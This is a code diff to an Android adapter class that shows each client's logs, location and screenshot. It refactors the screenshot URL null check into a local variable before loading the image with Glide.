@@ -55,10 +55,12 @@ class ClientAdapter(
         holder.tvLogs.text = "Logs: ${lastData?.logs?.take(100) ?: "N/A"}"
         holder.tvLocation.text = "📍 ${lastData?.location?.take(50) ?: "N/A"}"
 
+        val screenshotUrl = lastData?.screenshot_url.orEmpty()
+
         // Screenshot URL
-        if (!lastData?.screenshot_url.isNullOrEmpty()) {
+        if (screenshotUrl.isNotEmpty()) {
             Glide.with(holder.itemView.context)
-                .load(lastData.screenshot_url)
+                .load(screenshotUrl)
                 .placeholder(android.R.drawable.ic_menu_camera)
                 .error(android.R.drawable.ic_menu_report_image)
                 .into(holder.ivScreenshot)
